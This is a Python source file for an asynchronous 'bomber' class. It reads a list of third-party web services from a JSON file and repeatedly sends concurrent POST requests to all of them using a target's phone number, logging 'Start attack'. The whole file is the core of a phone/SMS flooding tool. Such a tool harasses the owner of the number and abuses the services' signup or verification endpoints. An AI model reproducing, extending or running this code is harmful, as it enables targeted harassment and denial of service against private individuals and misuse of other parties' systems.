import asyncio
from app.aio_bomber import sender, utils
from loguru import logger
import aiohttp
try:
    import ujson as json
except ImportError:
    import json


class AioBomber:
    def __init__(self, session: aiohttp.ClientSession = None, loop: asyncio.AbstractEventLoop = None) -> None:
        self._session = session or aiohttp.ClientSession(json_serialize=json.dumps)
        self._sender = sender.Sender(self._session)
        self._utils = utils.BomberUtils()
        if loop is None:
            try:
                loop = asyncio.get_running_loop()
            except RuntimeError:
                loop = asyncio.get_event_loop()
        self._loop = loop

    async def attack(self, number_of_cycles: int, phone: str, sleep_time: int = 2, path_to_service: str = None) -> None:
        logger.info('Start attack')
        path_to_service = path_to_service or 'app/aio_bomber/services.json'
        services = await self._sender.get_services(path_to_service)
        for _ in range(number_of_cycles):
            for value in services.values():
                args = self._utils.generate_args(value, phone)
                header = value.get('header')
                self._loop.create_task(self._sender.post(header=header, **args))
            await asyncio.sleep(sleep_time)

    @property
    def loop(self) -> asyncio.AbstractEventLoop:
        return self._loop

    @loop.setter
    def loop(self, event_loop: asyncio.AbstractEventLoop) -> None:
        if isinstance(event_loop, asyncio.AbstractEventLoop):
            self._loop = event_loop
        else:
            raise TypeError("You must pass event loop")

    @property
    def get_session(self) -> aiohttp.ClientSession:
        return self._session

    async def close_session(self) -> None:
        await self._session.close()
